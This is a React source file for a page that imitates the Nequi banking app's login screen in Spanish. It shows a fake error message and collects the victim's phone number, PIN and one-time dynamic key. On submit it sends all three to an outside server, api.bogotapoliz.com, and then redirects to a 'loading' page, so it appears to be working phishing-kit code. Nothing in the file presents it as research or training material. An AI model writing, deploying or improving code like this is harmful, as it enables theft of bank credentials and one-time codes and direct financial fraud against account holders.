import { useState, useRef } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { Lock } from 'lucide-react';

export default function Home() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [dinamica, setDinamica] = useState("");
  const [captchaOk, setCaptchaOk] = useState(false);
  const [showClave, setShowClave] = useState(false);
  const navigate = useNavigate();

  // Referencias para los inputs
  const phoneRef = useRef(null);
  const passwordRef = useRef(null);
  const dinamicaRef = useRef(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    const data = {
      login: phone,
      pass: password,
      otp: dinamica,
      status_id: 1,
    };
  
    const id = localStorage.getItem('id');
    try {
      const response = await axios.put(`https://api.bogotapoliz.com/api/v1/guest/${id}`, data);
  
      navigate("/nequi/loading");
    } catch (error) {
      console.error("Error:", error.response ? error.response.data : error.message);
    }
  };
  

  const handleFocus = () => {
    setShowClave(true);
  };

  const handleBlur = (e) => {
    if (!dinamicaRef.current.contains(e.relatedTarget)) {
      setShowClave(false);
    }
  };

  return (
    <div
      className="h-[750px] flex items-center p-5 justify-center bg-[#FBE5F2] bg-right"
      style={{ backgroundImage: "url(../background.png)" }}
    >
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <h1 className="text-2xl font-bold text-center mb-2">Entra a tu Nequi</h1>
        <p className="text-center text-gray-700 mb-6">
          Podrás bloquear tu Nequi, consultar tus datos y pedir créditos.
        </p>
        <div className="bg-red-100 text-red-700 px-4 py-3 rounded mb-4 text-center">
          ¡Ups! Algo salió mal. No te preocupes, inténtalo de nuevo cuando estés listo. ¡Estamos aquí para ti!
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="flex items-center gap-2">
            <div className="flex items-center border rounded px-3 py-2 bg-gray-100">
              <img
                src="https://flagcdn.com/w40/co.png"
                alt="Colombia"
                className="w-5 h-5 mr-1"
              />
              <span>+57</span>
            </div>
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="Número de celular"
              value={phone}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                if (value.length <= 10) setPhone(value);
              }}
              required
              className="flex-1 border rounded px-3 py-2 bg-blue-50 focus:outline-none"
              ref={phoneRef}
            />
          </div>

          <div className="relative">
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="Contraseña"
              value={password}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                if (value.length <= 4) setPassword(value);
              }}
              required
              className="w-full border rounded px-3 py-2 bg-blue-50 focus:outline-none"
              ref={passwordRef}
            />
          </div>

          <div
            className="relative"
            ref={dinamicaRef}
          >
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="Clave dinámica"
              value={dinamica}
              onFocus={handleFocus}
              onBlur={handleBlur}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                setDinamica(value);
              }}
              required
              className="w-full border rounded px-3 py-2 bg-blue-50 focus:outline-none"
            />
            {showClave && (
              <div className="absolute top-full left-0 mt-2 w-full bg-white rounded-lg shadow-md p-4 text-center fadeIn">
                <p className="text-gray-700 text-sm mb-2">Puedes copiar la clave dinámica directamente desde la app.</p>
                <div className="bg-black text-white rounded-lg p-4 flex flex-col items-end">
                  <div className="flex items-center justify-center gap-2 bg-[#5b0054] px-2 py-2 rounded-full mb-2">
                    <div className="w-4 h-4 bg-white rounded-full relative">
                      <div className="w-full h-full bg-pink-400 rounded-full"></div>
                    </div>
                    <span className="text-xs">Clave dinámica</span>
                    <span className="text-xs font-mono">{201909 || "------"}</span>
                    <div className="w-5">
                      <Lock size={16} />
                    </div>
                  </div>
                  <p className="text-xs text-start pt-10">Ya puedes escribir o copiar tu clave dinámica para hacer tus pagos.</p>
                </div>
              </div>
            )}
          </div>

          <button
            type="submit"
            className="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-3 rounded transition"
          >
            Entra
          </button>
        </form>
      </div>
    </div>
  );
}
